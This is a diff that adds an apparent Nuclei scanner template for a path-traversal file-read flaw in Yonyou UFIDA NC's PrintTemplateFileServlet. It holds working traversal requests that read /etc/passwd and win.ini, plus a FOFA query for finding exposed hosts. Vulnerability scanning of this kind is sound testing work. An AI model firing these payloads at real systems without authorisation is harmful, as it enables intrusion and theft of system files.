@@ -1,0 +1,33 @@
+id: yonyou-nc-PrintTemplateFileServlet-fileread
+
+info:
+  name: 用友 UFIDA NC nc.lfw.billtemplate.servlet.PrintTemplateFileServletfilePath - fileread
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: false
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,fileread,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/~uapweb/nc.lfw.billtemplate.servlet.PrintTemplateFileServletfilePath=../../../etc/passwd"
+      - "{{BaseURL}}/servlet/~uapweb/nc.lfw.billtemplate.servlet.PrintTemplateFileServletfilePath=../../../c:/windows/win.ini"
+    
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
